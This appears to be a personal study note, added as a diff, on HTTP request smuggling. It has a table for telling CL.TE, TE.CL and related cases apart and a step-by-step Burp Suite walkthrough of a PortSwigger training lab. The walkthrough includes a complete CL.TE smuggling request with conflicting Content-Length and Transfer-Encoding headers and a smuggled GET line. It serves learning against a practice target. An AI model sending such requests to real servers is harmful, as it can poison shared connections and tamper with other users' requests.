@@ -1,0 +1,56 @@
+Detecting 
+      1: 
+        Content-Length: 6                                          response (backend) >>>>CL.CL
+        Transfer-Encoding: chunked
+        \r\n                                                                          >>>>TE.CL
+        3\r\n                                    >>>>              reject (frontend)
+        abc\r\n                                                                       >>>>TE.TE
+        X\r\n                                                      
+                                                                   timeout (backend)  >>>>CL.TE
+
+
+      2:
+        Content-Length: 6                                                             >>>>CL.CL
+        Transfer-Encoding: chunked                                 response (backend)
+        \r\n                                                                          >>>>TE.TE
+        3\r\n                                    >>>>              timeout (backend)  >>>>TE.CL
+        abc\r\n
+        X                                                          socket poison (backend) >>>>CL.TE
+
+
+Task 1:
+///Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses///
+
+Open the site in burpsuite, and send the GET / request to repeater.
+At the first repeated request (call it to "Attacking request") change the protocol to http 1, turn on show non-printable chars, and next to the send button there is a little option menü, uncheck the "update content length"
+After this change the request methot to post, and delete everything between Host and Content-Type, like this:
+POST / HTTP/1.1
+Host: 0a9d008703d657ec81d0a2c800a500e5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+Add these lines:
+Transfer-Encoding: chunked
+
+3
+abc
+X (press enter after X!)
+
+Change the content-length to 6 and send it...it will be a lot of time to get a response actuall it will timeout, which means the site has a CL.TE vulnerability.
+Now modify our request like this:
+POST / HTTP/1.1
+Host: 0a9d008703d657ec81d0a2c800a500e5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 36
+
+0
+
+GET /asdf HTTP/1.1
+X-Ignore: X (do NOT press enter after X)
+And in options check back "update content length". 
+Now modify the second repeated request (lets call it "Normal request" like change the protocol to http 1.
+Now everyting is ready.
+Send the Attacking request, and after that send the Normal request, and we solved the lab.
+
+
